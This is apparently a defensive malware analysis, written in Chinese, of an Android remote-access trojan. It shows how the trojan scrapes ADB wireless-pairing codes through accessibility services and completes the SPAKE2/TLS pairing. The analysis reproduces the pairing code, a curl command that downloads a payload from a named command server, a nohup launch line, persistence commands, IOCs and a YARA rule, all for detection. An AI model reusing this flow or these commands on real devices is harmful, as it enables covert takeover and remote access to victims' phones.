# Tiangong RAT — ADB WiFi 配对机制深度分析

> **样本**: update.apk (tiangong RAT)
> **分析文件**: `jadx-reference/rock/service/modules/setup/C0360a2.java` (SystemOptimizeManager, 5666 行)
> **关联组件**: `jadx-reference/io/github/muntashirakon/crypto/spake2/Spake2Context.java`, `native/local-service-arm64`, `native/libspake2-arm64.so`, `native/libconscrypt-arm64.so`
> **日期**: 2026-04-17
> **性质**: 防御性安全研究

---

## 一、结论先行

ADB WiFi 配对**不是单独哪一层实现的，而是 Java 无障碍服务与 Go local-service 的双层协作**。

| 能力 | Java 无障碍 | Go local-service |
|------|:-----------:|:----------------:|
| 打开开发者选项 | ✅ UI 自动化 | — |
| 打开无线调试开关 | ✅ UI 点击 | ✅ `service call` (需已有 shell) |
| 点击"使用配对码配对设备" | ✅ 唯一实现 | — |
| **读取 6 位配对码** | ✅ **唯一实现** | — |
| **读取配对端口** | ✅ **唯一实现** | — |
| SPAKE2+TLS 协议握手 | ✅ Java 实现 | ✅ Go 独立实现 |
| `adb pair` 命令 | — | ✅ shell 执行 |
| `adb connect` | — | ✅ shell 执行 |
| NSD/mDNS 发现调试端口 | ✅ NsdManager | ✅ `scanAdbDebugPort` |
| 部署 local-service | ✅ 触发下载+启动 | — (自身) |
| 后续维护/重连 | — | ✅ watchdog + 重启 |

**核心瓶颈**：初次配对**必须**由 Java 无障碍驱动 — 只有 `AccessibilityService` 能从系统设置 UI 读取配对码弹窗。Go 层没有 UI 节点树访问权限。一旦获得 ADB shell 权限后，Go 可完全自主维护连接。

---

## 二、配对状态机

`SystemOptimizeManager$PairState` 是一个 8 态枚举，控制整个配对流程的推进：

```
                    ┌─────────────────────────────────────────────┐
                    │                                             │
                    ▼                                             │
           ┌───────────────┐                                     │
     ┌─────│ PAIR_UNKNOWN  │ (a0, 初始态)                        │
     │     └───────┬───────┘                                     │
     │             │ 进入开发者选项/无线调试                        │
     │             ▼                                             │
     │     ┌───────────────────────────┐                         │
     │     │ PAIR_LEAVE_DEV_OPT (a1)  │                         │
     │     │ 离开开发者选项进入无线调试  │                         │
     │     └───────┬───────────────────┘                         │
     │             │ 点击"使用配对码配对设备"                       │
     │             ▼                                             │
     │     ┌───────────────────┐                                 │
     │     │  PAIRING (a3)     │                                 │
     │     │  等待/执行配对中   │                                 │
     │     └──┬────────────┬───┘                                 │
     │        │            │                                     │
     │   成功 ▼            ▼ 失败                                │
     │  ┌─────────────┐  ┌────────────────┐                     │
     │  │PAIR_SUCCESS  │  │ PAIR_FAIL (a4) │────────────────────┘
     │  │   (a2)       │  └────────────────┘     (重试回 UNKNOWN)
     │  └──────┬──────┘
     │         │ USB 安装/安全设置处理
     │         ▼
     │  ┌─────────────────────┐
     │  │PREPARE_FINISH (a5)  │
     │  │ 准备完成收尾         │
     │  └──────┬──────────────┘
     │         │ 部署完成
     │         ▼
     │  ┌─────────────────┐
     │  │PAIR_FINISH (a6) │
     │  │ 配对流程结束      │
     │  └─────────────────┘
     │
     └── (PAIR_RETRY a3': 代码中定义但未实际使用)
```

状态存储：`AtomicReference<PairState> f53819a4`，线程安全。

---

## 三、完整配对流程（代码级还原）

### 阶段 1：UI 自动化进入无线调试

**入口方法**: `m211995b4()` (行 704)

```
1. 获取屏幕根节点 getRootInActiveWindow()
2. 品牌适配 (行 715-726):
   - vivo/iqoo: 查找 "com.android.settings:id/switch_bar" 并点击
   - 其他品牌: 调用 m212033a7() 通用逻辑
3. 滚动查找无线调试栏目 (行 504, m212102l2)
4. 如果找到"撤消USB调试授权"节点则先处理 (行 555-558)
5. 状态 → PAIR_LEAVE_DEV_OPT
```

### 阶段 2：点击配对按钮

**代码位置**: `m211995b4()` 行 731-754

```
1. 循环最多 20 次查找 [使用配对码配对设备] 按钮
   - findAccessibilityNodeInfosByViewId 查找
   - 每次失败等待 1.5 秒 (C0362a4.m212113a8)
2. 找到后延迟 300ms
3. 查找可点击祖先节点 (m211990a9)
4. performAction(ACTION_CLICK=16)
5. 状态 → PAIRING
```

### 阶段 3：读取配对码（关键瓶颈）

**方法**: `m212098k8()` (行 5311-5375)

这是**只有无障碍才能完成**的步骤：

```java
// 1. 获取当前屏幕所有 UI 节点
AccessibilityNodeInfo root = f53815a0.getRootInActiveWindow();
ArrayList allNodes = new ArrayList();
m212007f2(root, allNodes);  // 递归收集所有节点

// 2. 遍历节点文本，解析 port 和 code
for (node : allNodes) {
    String text = node.getText().toString().trim();
    
    // 排除已知无关文本 (dh0.f55787d7 白名单)
    if (knownStrings.contains(text)) continue;
    
    // 解析 "IP:Port" 格式 (行 5331-5346)
    List parts = text.split(":", 6);
    if (parts.size() == 2) {
        String afterColon = parts[1].trim();
        if (allDigits(afterColon)) {
            port = Integer.parseInt(afterColon);  // → f57455a1
        }
    }
    
    // 解析独立的 6 位纯数字 → 配对码 (行 5349-5360)
    if (parts.size() == 1 && text.length() == 6 && allDigits(text)) {
        code = text;  // → f57456a2
    }
    
    // 两者都找到则退出
    if (code.length() > 0 && port > 0) break;
}

// 3. 返回 k41 { port, code }
```

**解析策略**：
- 配对码弹窗中有多个 TextView
- port 通常以 `IP:端口` 格式显示（如 `127.0.0.1:37853`）
- 配对码是独立的 6 位纯数字节点（如 `482917`）
- 排除按钮文本等干扰项

**等待逻辑** (行 756-763)：
```java
long deadline = System.currentTimeMillis() + 10000;  // 10 秒超时
while (System.currentTimeMillis() < deadline) {
    Thread.sleep(500);  // 每 500ms 重试
    result = m212098k8();
    if (result != null) break;
}
```

### 阶段 4：SPAKE2+TLS 协议握手

**方法**: `m212054e2(int port, String pairCode)` (行 2743-2823)

```
步骤 4.1 — 建立 TLS 1.3 连接 (行 2746-2752):
    Socket raw = new Socket("127.0.0.1", port);
    raw.setTcpNoDelay(true);
    SSLSocket ssl = sslContext.getSocketFactory().createSocket(raw, "127.0.0.1", port, true);
    ssl.setEnabledProtocols(new String[]{"TLSv1.3"});  // 强制 TLS 1.3
    ssl.startHandshake();

步骤 4.2 — 导出 TLS 密钥材料 (行 2756):
    byte[] keyingMaterial = m212006f0(sslSocket);
    // 反射调用 SSLSocket.exportKeyingMaterial() (Android 内部 API)
    // 使用 libconscrypt-arm64.so 提供的 BoringSSL TLS 实现

步骤 4.3 — 构造 SPAKE2 密码 (行 2763-2767):
    byte[] codeBytes = pairCode.getBytes(UTF-8);
    byte[] password = new byte[codeBytes.length + keyingMaterial.length];
    System.arraycopy(codeBytes, 0, password, 0, codeBytes.length);
    System.arraycopy(keyingMaterial, 0, password, codeBytes.length, keyingMaterial.length);
    // 密码 = pairCode_UTF8 || TLS_exported_keying_material

步骤 4.4 — SPAKE2 密钥交换 (行 2768-2783):
    byte[] clientId = "adb pair client\0".getBytes(UTF-8);
    byte[] serverId = "adb pair server\0".getBytes(UTF-8);
    Spake2Context ctx = new Spake2Context(clientId, serverId);
    
    // 生成 SPAKE2 消息（包含密码承诺）
    byte[] outMsg = ctx.generateMessage(password);     // → libspake2-arm64.so JNI
    sendMessage(outputStream, TYPE_SPAKE2=0, outMsg);  // 发给 adbd
    
    // 接收服务端 SPAKE2 消息
    Header header = readHeader(inputStream);            // 24 字节 ADB 消息头
    byte[] serverMsg = readFully(inputStream, header.length);
    
    // 处理服务端消息 → 得到共享密钥
    byte[] sharedSecret = ctx.processMessage(serverMsg); // → 32 字节

步骤 4.5 — HKDF 密钥派生 (行 2784-2786):
    byte[] label = "adb pairing_auth aes-128-gcm key".getBytes(UTF-8);
    byte[] aesKey = HKDF_SHA256(sharedSecret, label);  // m212020h5()

步骤 4.6 — PeerInfo 交换 (行 2787-2809):
    // 加密己方 PeerInfo（含 RSA 公钥）
    byte[] encryptedPeerInfo = AES_128_GCM_Encrypt(aesKey, localPeerInfo);  // m211999c3()
    sendMessage(outputStream, TYPE_PEER_INFO=1, encryptedPeerInfo);
    
    // 接收并解密服务端 PeerInfo
    Header header2 = readHeader(inputStream);
    byte[] encServerPeer = readFully(inputStream, header2.length);
    byte[] serverPeerInfo = AES_128_GCM_Decrypt(aesKey, encServerPeer);  // m211998c2()
    
    // 验证成功
    ctx.destroy();  // 清零 native 内存
    return true;    // 配对完成
```

### 阶段 5：后续部署

**配对成功后** (行 769-791, 2609-2653)：

```
1. 上传 ADB 证书到 C2
   → m212100l0() → POST {C2}/api/adb-keys/{deviceId}

2. 同步 ADB 配置到 local-service
   → POST http://127.0.0.1:7912/syncADBConfig
   → body: {"paired":true, "updateTime":..., "deviceId":"...", "debugPort":...}

3. 从屏幕读取调试端口（非配对端口）
   → m212021i7(rootInActiveWindow)
   → 最多重试 5 次，每次等待 1 秒

4. 部署 local-service (m212096k6, 行 5194)
   优先级:
   a. 检查 /data/local/tmp/local-service 是否已存在且运行
   b. 从 APK nativeLibraryDir 复制 liblocal-service.so
   c. 网络下载: curl https://rathat.me/lib/{abi}/local-service

5. 启动 local-service
   → "nohup /data/local/tmp/local-service server -d -s > /data/local/tmp/local-service.log 2>&1 &"

6. 确保 frpc 存在
   → 检查 /data/local/tmp/frpc 是否存在
   → 不存在则触发 m212050d8() 从 C2 下载
```

---

## 四、Go local-service 的补充配对能力

Go 二进制内有独立的配对实现，但**定位不同**：

### 4.1 `performAdbTlsPair` (Go 层 SPAKE2)

```
Go 符号:
  main.performAdbTlsPair
  main.performAdbTlsPair.Printf.func{1,2,3,4}
  main.performTlsPairDirect
  main.performTlsPairDirect.Printf.func1
```

Go 使用标准库 `crypto/tls` 实现 TLS 1.3 握手，内置 SPAKE2 协议。但 Go **不能自行获取配对码**，必须通过以下方式接收：

- Java 通过 HTTP IPC 传入：`POST http://127.0.0.1:7912/requestLocalAdbPair`
- C2 通过 WebSocket bridge 下发

### 4.2 `adb pair` 命令方式

```
Go 字符串: "adb pair localhost:%s %s"
         "[AdbPair] adb pair"
Go 符号:  main.handleLocalAdbPair
```

这是最简方式——直接调用 `adb pair localhost:{port} {code}` shell 命令。同样需要外部提供 port+code。

### 4.3 无线调试开关控制

```
Go 符号:
  main.enableWifiDebug
  main.handleEnableWifiDebug
  main.handleCloseWifiDebug
  main.scanAdbDebugPort

Go 字符串:
  "service call wireless_debugging 5 s16 \"%s\""
  "settings get global adb_wifi_enabled"
```

已有 ADB shell 权限后，Go 可绕过 UI 直接操控无线调试系统服务。

### 4.4 NSD 端口扫描

```
Go 符号: main.scanAdbDebugPort
         main.scanAdbDebugPort.func1
```

Go 层也实现了 ADB 调试端口的网络扫描发现（等价于 Java 的 NsdManager 方式）。

---

## 五、两层协作时序图

### 场景 A：首次配对（无 ADB 权限）

```
┌────────────────┐  ┌──────────────────┐  ┌──────────────┐  ┌────────┐
│  Java 无障碍    │  │ Android 系统设置  │  │  adbd 守护进程│  │  C2    │
└───────┬────────┘  └────────┬─────────┘  └──────┬───────┘  └───┬────┘
        │                    │                   │              │
        │ 1. 打开开发者选项   │                   │              │
        │ ──click──────────>│                   │              │
        │                    │                   │              │
        │ 2. 打开无线调试开关 │                   │              │
        │ ──click switch───>│                   │              │
        │                    │                   │              │
        │ 3. 点击"配对码配对" │                   │              │
        │ ──click──────────>│                   │              │
        │                    │ 弹出配对码对话框    │              │
        │                    │<── 生成 port+code │              │
        │                    │                   │              │
        │ 4. 读取配对码       │                   │              │
        │ ──getText()──────>│                   │              │
        │ (port=37853,       │                   │              │
        │  code=482917)      │                   │              │
        │                    │                   │              │
        │ 5. TLS 1.3 连接 127.0.0.1:37853       │              │
        │ ──────────────────────────────────────>│              │
        │                    │                   │              │
        │ 6. SPAKE2 密钥交换 (password=code||TLS_keying)        │
        │ <─────────────────────────────────────>│              │
        │                    │                   │              │
        │ 7. HKDF → AES-128-GCM → PeerInfo 交换 │              │
        │ <─────────────────────────────────────>│              │
        │                    │                   │              │
        │ 8. 配对成功！获得 ADB 授权              │              │
        │                    │                   │              │
        │ 9. 上传证书到 C2    │                   │              │
        │ ──────────────────────────────────────────────POST──>│
        │                    │                   │  /api/adb-keys│
        │                    │                   │              │
        │ 10. 部署 local-service                  │              │
        │ ──adb shell──────────────────────────>│              │
        │   cp liblocal-service.so →             │              │
        │   /data/local/tmp/local-service        │              │
        │   chmod 777 && nohup ... server -d &   │              │
        │                    │                   │              │
```

### 场景 B：后续维护（已有 ADB shell）

```
┌────────────────┐  ┌──────────────────┐  ┌──────────────┐  ┌────────┐
│ Go local-svc   │  │ Android 系统服务  │  │     adbd     │  │  C2    │
└───────┬────────┘  └────────┬─────────┘  └──────┬───────┘  └───┬────┘
        │                    │                   │              │
        │ H() 心跳检测:                          │              │
        │ local-service 未运行 +                 │              │
        │ 无线调试关闭                            │              │
        │                    │                   │              │
        │ 1. 开启无线调试     │                   │              │
        │ ──service call────>│                   │              │
        │   wireless_debugging                   │              │
        │   5 s16 "{pkg}"    │                   │              │
        │                    │                   │              │
        │ 2. 扫描调试端口     │                   │              │
        │ ──scanAdbDebugPort>│                   │              │
        │                    │                   │              │
        │ 3. adb connect 127.0.0.1:{port}        │              │
        │ ──────────────────────────────────────>│              │
        │  (已有授权证书，无需重新配对)             │              │
        │                    │                   │              │
        │ 4. 恢复 shell 权限  │                   │              │
        │ ──────────────────────────────────────>│              │
        │                    │                   │              │
        │ 5. 重启 local-service                  │              │
        │   nohup ... server -d -s &             │              │
        │                    │                   │              │
        │ 6. 心跳上报         │                   │              │
        │ ──────────────────────────────────────────────POST──>│
        │                    │                   │ /localService │
        │                    │                   │  Heartbeat    │
```

### 场景 C：C2/Java 委托 Go 配对

```
┌────────────────┐  ┌──────────────────┐  ┌──────────────┐
│  Java 无障碍    │  │ Go local-service │  │     adbd     │
└───────┬────────┘  └────────┬─────────┘  └──────┬───────┘
        │                    │                   │
        │ 1. 读取配对码       │                   │
        │ (port+code)        │                   │
        │                    │                   │
        │ 2. 委托 Go 执行     │                   │
        │ ──POST 7912/───── │                   │
        │  requestLocalAdbPair                   │
        │  {port, code}      │                   │
        │                    │                   │
        │                    │ 3a. adb pair       │
        │                    │ ──shell──────────>│
        │                    │ "adb pair localhost│
        │                    │  :{port} {code}"  │
        │                    │                   │
        │                    │   --- 或 ---      │
        │                    │                   │
        │                    │ 3b. performTlsPair │
        │                    │ ──TLS 1.3+SPAKE2─>│
        │                    │ (Go 独立实现)       │
        │                    │                   │
```

---

## 六、密码学组件详解

### 6.1 Spake2Context.java

**文件**: `io/github/muntashirakon/crypto/spake2/Spake2Context.java` (146 行)

```java
// 本质是 libspake2-arm64.so 的 JNI 封装
// 来源: muntashirakon 是 App Manager (开源 Android 管理工具) 的作者
// RAT 直接复用了其 SPAKE2 Java binding

public class Spake2Context {
    private long nativePtr;  // native 上下文指针
    
    // 初始化：role=0 (CLIENT)
    Spake2Context(byte[] clientId, byte[] serverId) {
        nativePtr = allocNewContext(0, clientId, serverId);
    }
    
    // 生成 SPAKE2 消息（第一轮）
    byte[] m213179a0(byte[] password) { return generateMessage(nativePtr, password); }
    
    // 处理服务端消息 → 共享密钥（第二轮）
    byte[] m213180a5(byte[] serverMsg) { return processMessage(nativePtr, serverMsg); }
    
    // 清零释放
    void destroy() { destroyContext(nativePtr); nativePtr = 0; }
}
```

### 6.2 libspake2-arm64.so

标准 BoringSSL/Android 源码中的 SPAKE2 实现移植。非自定义算法。

### 6.3 libconscrypt-arm64.so

Google Conscrypt (基于 BoringSSL) 的 TLS 提供者，用于：
- TLS 1.3 SSLSocket factory (`m212047d5().getSocketFactory()`)
- TLS 密钥材料导出 (`m212006f0(sslSocket)` — 反射调用 `exportKeyingMaterial`)

### 6.4 TLS 密钥材料导出

**方法**: `m212006f0()` (行 1064)

```java
// 通过反射调用 Android 内部 API
// Conscrypt SSLSocket 的 exportKeyingMaterial()
// 这是 ADB 配对协议的关键 — 将 TLS 会话绑定到 SPAKE2 密钥交换
// 防止中间人在 TLS 层面降级攻击
```

### 6.5 密码构造

```
SPAKE2_password = pairCode_bytes (6字节 UTF-8) || TLS_keying_material (32字节)
```

这确保了：
1. 知道配对码不够 — 还必须参与了同一 TLS 会话
2. TLS 会话不够 — 还必须知道配对码
3. 两者结合才能完成 SPAKE2 认证

### 6.6 HKDF 密钥派生

```
shared_secret = SPAKE2.processMessage(serverMsg)  // 32 字节
label = "adb pairing_auth aes-128-gcm key"
aes_key = HKDF-SHA256(shared_secret, label)        // 16 字节 AES-128 密钥
```

### 6.7 PeerInfo 交换

```
本地 PeerInfo = m212046d4():
  - 包含 RSA-2048 公钥 (X.509 DER 编码)
  - 格式: ADB PeerInfo 结构 (type + publicKey)

加密: AES-128-GCM(aesKey, peerInfo)  → m211999c3()
解密: AES-128-GCM(aesKey, ciphertext) → m211998c2()
```

---

## 七、ADB 消息格式

**方法**: `m212024j9()` (发送) / `m212022i8()` (接收) / `m211996b5()` (解析)

### 7.1 消息头 (24 字节, Little-Endian)

```
偏移  长度  字段
0     4    command (int32)
4     4    arg0 (int32)
8     4    arg1 (int32)
12    4    data_length (int32)
16    4    data_checksum (int32) — 保留
20    4    magic (int32) — 保留
```

### 7.2 消息类型

| type 值 | 含义 | 方向 |
|---------|------|------|
| 0 | SPAKE2 消息 | 双向 |
| 1 | PeerInfo (加密) | 双向 |

### 7.3 RSA 密钥签名格式

**方法**: `m211997b6()` (行 827-839)

使用 `RSA/ECB/NoPadding` 进行 PKCS#1 v1.5 格式的 RSA 签名（234 字节固定 padding 数组），这是 ADB 认证协议的标准格式。

---

## 八、local-service 部署链

配对成功后，Java 层按以下优先级部署 Go 二进制：

```
优先级 1: 检查 /data/local/tmp/local-service 是否已存在且运行
          → ps -ef | grep "local-service server"
          → 如已运行则跳过

优先级 2: 从 APK 的 nativeLibraryDir 复制
          → cp -f {nativeLibDir}/liblocal-service.so /data/local/tmp/local-service
          → chmod 777

优先级 3: 从 C2 网络下载
          → curl -o /data/local/tmp/local-service.tmp -L '{C2_URL}'
          → mv + chmod 777

优先级 4: 从备用域名下载 ⚠️ 新 IOC
          → curl https://rathat.me/lib/{abi}/local-service
          → abi = Build.SUPPORTED_ABIS[0] (arm64-v8a / armeabi-v7a)
```

**启动命令**:
```bash
nohup /data/local/tmp/local-service server -d -s > /data/local/tmp/local-service.log 2>&1 &
```

**部署后操作**:
- 确保 frpc 二进制存在 → 不存在则从 C2 下载 (`/api/binary/{arch}/frpc`)
- 通知 local-service 服务器配置：`POST http://127.0.0.1:7912` (serverAddr, deviceId, keySalt)
- 设置系统保活白名单 (行 2092-2107)

---

## 九、心跳维护循环 H()

**代码位置**: 行 3450-3535

配对成功且 local-service 部署后，Java 层进入稳态心跳循环：

```
┌──────── H() 心跳循环 ────────┐
│                               │
│  1. local-service 运行中？     │
│     ├── 是 → 跳过 ADB 逻辑    │
│     └── 否 ↓                  │
│                               │
│  2. 检查证书/密钥              │
│     ├── cert.pem 存在？        │
│     ├── private.key 存在？     │
│     └── 都不存在 → 自动生成     │
│         RSA-2048 自签名证书    │
│                               │
│  3. adb_deploy_enabled?       │
│     └── 否 → 跳过              │
│                               │
│  4. 无线调试开启？              │
│     └── 否 → m212097k7()      │
│         尝试重新开启            │
│                               │
│  5. 提交异步恢复任务            │
│     → (重新 adb connect       │
│        + 重启 local-service)  │
└───────────────────────────────┘
```

---

## 十、检测特征汇总

### 10.1 SPAKE2 协议特征

```
# 身份字符串（YARA）
"adb pair client\x00"    (17 bytes)
"adb pair server\x00"    (17 bytes)

# HKDF label
"adb pairing_auth aes-128-gcm key"  (32 bytes)

# TLS 版本强制
setEnabledProtocols(["TLSv1.3"])
```

### 10.2 网络 IOC

```
# local-service 下载
https://rathat.me/lib/{abi}/local-service     ⚠️ 新发现 IOC

# ADB 证书上传
POST {C2}/api/adb-keys/{deviceId}

# ADB 配置同步
POST http://127.0.0.1:7912/syncADBConfig
POST http://127.0.0.1:7912/requestLocalAdbPair
POST http://127.0.0.1:7912/reloadPairKeyFiles
POST http://127.0.0.1:7912/enableWifiDebug
POST http://127.0.0.1:7912/localAdbConnect

# mDNS 服务发现
_adb._tcp
_adb-tls-connect._tcp
```

### 10.3 文件 IOC

```
/data/local/tmp/local-service          # Go 二进制
/data/local/tmp/local-service.log      # 日志
/data/local/tmp/local-service.pid      # PID
/data/local/tmp/cert.pem               # ADB 自签名证书
/data/local/tmp/private.key            # RSA 私钥
```

### 10.4 Shell 命令特征

```bash
# 无线调试操控
service call wireless_debugging 5 s16 "%s"
settings get global adb_wifi_enabled

# ADB 配对
adb pair localhost:%s %s

# local-service 启动
nohup /data/local/tmp/local-service server -d -s > /data/local/tmp/local-service.log 2>&1 &

# 进程检测
ps -ef | grep "local-service server" | grep -v grep

# 保活白名单
cmd deviceidle whitelist +{pkg}
cmd netpolicy add restrict-background-whitelist {uid}
cmd appops set {pkg} RUN_IN_BACKGROUND allow
cmd appops set {pkg} RUN_ANY_IN_BACKGROUND allow
am set-standby-bucket {pkg} active
```

### 10.5 SharedPreferences 特征

```
文件名: system_optimize
字段:
  pair_completed: true        (配对成功标记)
  adb_deploy_enabled: true    (已成功部署标记)
```

### 10.6 Go 二进制符号（pclntab 残留）

```
main.performAdbTlsPair
main.performTlsPairDirect
main.handleLocalAdbPair
main.handleLocalAdbConnect
main.handleLocalAdbShell
main.handleLocalAdbPush
main.enableWifiDebug
main.scanAdbDebugPort
main.handleReloadPairKeyFiles
main.handleEnableWifiDebug
main.handleCloseWifiDebug
```

---

## 十一、YARA 规则补充

```yara
rule TiangongRAT_ADB_Pairing_APK {
    meta:
        description = "Tiangong RAT — ADB WiFi SPAKE2 pairing capability in APK"
        author = "Security Research"
        date = "2026-04-17"

    strings:
        // SPAKE2 identity strings
        $spake_client = "adb pair client" ascii
        $spake_server = "adb pair server" ascii
        $spake_label  = "adb pairing_auth aes-128-gcm key" ascii

        // local-service deployment
        $deploy_path  = "/data/local/tmp/local-service" ascii
        $deploy_cmd   = "local-service server -d" ascii
        $deploy_url   = "rathat.me" ascii

        // ADB pair logging
        $log_pair     = "SPAKE2+TLS" ascii wide
        $log_optimize = "SystemOptimize" ascii

        // SharedPrefs markers
        $prefs_name   = "system_optimize" ascii
        $prefs_key1   = "pair_completed" ascii
        $prefs_key2   = "adb_deploy_enabled" ascii

        // wireless debugging shell
        $wifi_debug   = "wireless_debugging" ascii
        $adb_wifi     = "adb_wifi_enabled" ascii

        // Certificate handling
        $cert_path    = "/data/local/tmp/cert.pem" ascii
        $key_path     = "/data/local/tmp/private.key" ascii

        // mDNS service types
        $mdns1        = "_adb._tcp" ascii
        $mdns2        = "_adb-tls-connect._tcp" ascii

    condition:
        // DEX magic
        uint32(0) == 0x0A786564 or uint16(0) == 0x4B50    // dex or ZIP/APK
        and (
            ($spake_client and $spake_label)
            or ($deploy_path and $deploy_cmd)
            or ($log_pair and $log_optimize)
            or (3 of ($prefs_name, $prefs_key1, $prefs_key2, $wifi_debug, $adb_wifi))
            or ($cert_path and $key_path and $deploy_path)
            or ($mdns1 and $mdns2 and $spake_label)
            or ($deploy_url and $deploy_path)
        )
}
```

---

## 十二、与基础设施层通信审计的交叉关联

| 通信组件 | ADB 配对中的角色 |
|---------|----------------|
| **HttpManager** (`C0268a1`) | 上传 ADB 证书到 C2 (`/api/adb-keys/{deviceId}`) |
| **DataSyncClient** (`C0267a0`) | 接收 C2 下发的配对/部署命令 |
| **local-service :7912** | 接收 Java 的 `/requestLocalAdbPair` 委托 |
| **local-service WS bridge** | 接收 C2 的远程配对指令 |
| **frpc 隧道** | 配对成功后由 local-service 部署，提供持久化远程访问 |
| **XOR 密钥 `K9qZ-XlN7Q`** | 用于 frpc 二进制解密（配对成功后的下一步） |

ADB 配对是整个 RAT 基础设施的**关键升级节点** — 配对前只有无障碍级别的有限控制，配对后获得完整 shell 权限，可以部署 local-service + frpc，实现深度持久化和隧道穿透。
